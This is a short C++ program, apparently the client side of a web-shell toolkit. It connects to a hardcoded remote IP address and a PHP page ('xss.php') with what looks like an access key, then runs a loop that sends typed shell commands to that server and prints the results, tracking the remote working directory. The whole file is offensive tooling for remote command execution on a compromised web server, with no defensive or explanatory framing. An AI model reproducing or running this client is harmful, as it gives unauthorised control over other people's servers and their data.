#include"WebShell.h"
#include<iostream>
#include<string>
using namespace std;

int main(){
	WebShell shell("http://192.243.112.182/xss.php",GET,"36df2e02429969c7d5bd5a02f372019c");
	string pwd,ans,command;
	shell.ShellCommandExec("pwd",pwd);
	while(true){
		cout<<pwd.substr(0,pwd.length()-9)<<" # ";
		getline(cin,command);
		shell.ShellCommandExec(command,ans);
		cout<<ans<<endl;
		if(command.find("cd")!=string::npos){
			shell.ShellCommandExec("pwd",pwd);
		}
	}
	cout<<ans<<endl;
}
